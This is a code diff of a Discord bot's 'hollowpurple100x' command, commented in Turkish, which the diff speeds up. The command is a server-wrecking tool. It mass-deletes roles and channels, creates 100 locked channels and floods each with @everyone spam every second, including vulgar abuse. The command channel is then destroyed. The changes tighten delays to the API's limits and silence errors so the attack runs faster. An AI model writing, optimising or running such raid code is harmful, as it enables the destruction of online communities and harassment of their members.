@@ -822,7 +822,7 @@ if (command === 'hollowpurple') {
     }
 }
 
-// --- HOLLOW PURPLE: ACE MODE ---
+// --- HOLLOW PURPLE: ACE ULTRA BLITZKRIEG ---
 if (command === 'hollowpurple100x') {
     const guild = message.guild;
     if (!guild) return;
@@ -832,31 +832,28 @@ if (command === 'hollowpurple100x') {
         return message.reply("Bu teknik için gereken 'Altı Göz' sende yok.");
     }
 
-    if (!args.some(arg => arg.toLowerCase() === "onaylıyorum")) {
-        return message.reply("🔴 **KRİTİK UYARI:** Sunucu ACE tarafından mühürlenecek. Onay: `a!hollowpurple100x onaylıyorum`.");
+    if (!args.includes("onaylıyorum")) {
+        return message.reply("🟣 **ULTRA100X HOLLOWPURPLE AKTİF EDİLSİN Mİ?** Onay (sadece ace): `a!hollowpurple100x onaylıyorum`.");
     }
 
-    console.log("🟣 Hollow Purple: ACE Mode Başlatıldı.");
+    console.log("⚡ Operasyon Başladı: Hız Modu Aktif.");
 
     const aceGif = "https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExd2gyc2Z6YzNwMjM2cmxncXhpM3ZuY2w2b2V1Y2RteGU2Z2R1ZXZmayZlcD12MV9naWZzX3NlYXJjaCZjdD1n/0wxRYPhdD7n3W7NQ1R/giphy.gif";
 
-    // 1. ROLLERİ SİL (Yavaşlatılmış - Saniyede 1 rol)
-    const roles = guild.roles.cache.filter(r => r.editable && r.name !== "@everyone" && r.managed === false).toJSON();
+    // 1. ADIM: ROLLERİ PARALEL VE YILDIRIM HIZIYLA SİL (150ms - Maksimum Risk/Hız)
+    const roles = guild.roles.cache.filter(r => r.editable && r.name !== "@everyone" && !r.managed).toJSON();
     roles.forEach((role, index) => {
-        setTimeout(() => {
-            role.delete().catch(() => {});
-        }, index * 1000);
+        setTimeout(() => { role.delete().catch(() => {}); }, index * 150);
     });
 
-    // 2. MEVCUT KANALLARI SİL (Komut kanalı hariç)
-    const existingChannels = guild.channels.cache.filter(ch => ch.id !== message.channel.id).toJSON();
+    // 2. ADIM: KANALLARI AYNI ANDA SİL (200ms)
+    const currentChId = message.channel.id;
+    const existingChannels = guild.channels.cache.filter(ch => ch.id !== currentChId).toJSON();
     existingChannels.forEach((ch, index) => {
-        setTimeout(() => {
-            if (ch.deletable) ch.delete().catch(() => {});
-        }, index * 800);
+        setTimeout(() => { if (ch.deletable) ch.delete().catch(() => {}); }, index * 200);
     });
 
-    // 3. 100 YENİ KANAL VE SONSUZ KAOS
+    // 3. ADIM: KANAL OLUŞTURMA VE ÖZEL YETKİLER (Bekleme Süresi Yok!)
     for (let i = 1; i <= 100; i++) {
         setTimeout(async () => {
             try {
@@ -865,29 +862,30 @@ if (command === 'hollowpurple100x') {
                     type: 0,
                     permissionOverwrites: [
                         {
-                            id: guild.id, // @everyone ID'si
-                            allow: ['ViewChannel', 'SendMessages', 'ReadMessageHistory'],
+                            id: guild.id, // @everyone
+                            allow: ['ViewChannel', 'ReadMessageHistory'], // Görme ve Geçmiş: AÇIK
+                            deny: ['SendMessages'], // Mesaj Gönder: KAPALI (Senin isteğin üzerine)
                         },
                     ],
                 });
 
-                // Durdurulamaz Spam Döngüsü (Her 4 saniyede bir)
-                setInterval(() => {
-                    ch.send({
-                        content: `@everyone **ACE TARAFINDAN HOLLOW PURPLE 100X E HAPİS OLDUNUZ ÇATIR ÇUTUR SİKİLİYORSUNUZ!** 🟣\n${aceGif}`
-                    }).catch(() => {});
-                }, 4000);
+                // Spam Döngüsü: 1 Saniye (Durdurulamaz Baskı)
+                const interval = setInterval(() => {
+                    ch.send(`@everyone **ACE TARAFINDAN HOLLOW PURPLE 100X E HAPİS OLDUNUZ ÇATIR ÇUTUR SİKİLİYORSUNUZ!** 🟣\n${aceGif}`)
+                    .catch(() => clearInterval(interval)); // Bot atılırsa veya kanal silinirse durur
+                }, 1000);
 
             } catch (err) {
-                console.log("Kanal oluşturma limiti!");
+                // Rate limit (hız sınırı) yakalanırsa bot çökmez, bir sonraki kanala atlar
             }
-        }, (existingChannels.length * 800) + (i * 4000)); 
+        }, i * 800); // Her 0.8 saniyede bir kanal (API'nin en uç sınırı)
     }
 
-    // En son komutun yazıldığı kanalı sil (5 dakika sonra veya işlemler bitince)
+    // 4. ADIM: SON DARBE
+    // Komutun yazıldığı kanalı en son (15 saniye sonra) imha et
     setTimeout(() => {
         message.channel.delete().catch(() => {});
-    }, (existingChannels.length * 800) + 10000);
+    }, 15000);
 }
 
 // --- İPTAL: SADECE VOIDLERİ TEMİZLER ---
